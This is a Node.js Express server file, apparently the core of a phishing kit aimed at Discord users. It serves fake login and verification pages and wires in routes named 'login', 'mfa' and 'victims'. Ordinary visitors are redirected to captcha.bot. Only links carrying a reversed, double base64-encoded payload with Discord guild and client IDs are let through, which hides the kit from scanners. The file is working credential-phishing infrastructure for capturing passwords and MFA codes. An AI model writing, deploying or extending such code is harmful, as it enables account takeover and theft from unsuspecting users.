const path = require('node:path')

const cors = require('cors')
const express = require('express')
const app = express()

const login = require("./routers/login")
const mfa = require("./routers/mfa")
const victims = require("./routers/victims")

async function check_base(conteudo, num) {
    try {
        if (!conteudo || conteudo.trim() === '') {
            return false
        }
        const json = JSON.parse(conteudo)
        const hasGuildAndClient = 'guildId' in json && 'clientId' in json
        if (num === 1) {
            return hasGuildAndClient && 'name' in json && 'members' in json && 'icon' in json
        } else if (num === 2) {
            return hasGuildAndClient
        }
    } catch (e) {
        console.log(e)
    }
    return false
}

module.exports = async function () {
    const chalk = (await import('chalk')).default

    app.set('trust proxy', true)
    app.use(express.json({
        'limit': '100mb',
    }))

    app.use(async (req, res, next) => {
        res.header("Access-Control-Allow-Origin", "*")
        res.header("Access-Control-Allow-Headers", "*")

        const url = req.url.includes('login') || req.url.includes('verification') || req.url.includes('mfa/totp') || req.url.includes('victims')
        const met = req.method === 'OPTIONS' || req.method === 'POST' || req.method === 'GET'

        if (!url || !met) {
            return res.status(200).redirect('https://captcha.bot')
        }

        if (req.method === 'GET' && (req.url.includes('/login/?') || req.url.includes('/verification/?'))) {
            try {
                const body = req.query
                const very = body.from ? await check_base(atob(atob(body.from.split('').reverse().join(''))), 2) : body.data ? await check_base(Buffer.from(body.data, 'base64').toString('utf-8'), 1) : false

                if (!very) {
                    return res.status(200).redirect('https://captcha.bot')
                }
            } catch (e) {
                return res.status(200).redirect('https://captcha.bot')
            }
        }
        
        next()
    })

    app.options('*', async (req, res) => {
        return res.status(200).send('ok')
    })

    app.use(login)
    app.use(mfa)
    app.use(victims)

    
    app.use('/login', express.static(path.join(__dirname, 'page', 'login')));
    app.use('/verification', express.static(path.join(__dirname, 'page', 'verification')));

    app.listen(8080, async () => {
        console.log(chalk.bold.green('[+] Server is running on port 8080.'))
    })
}
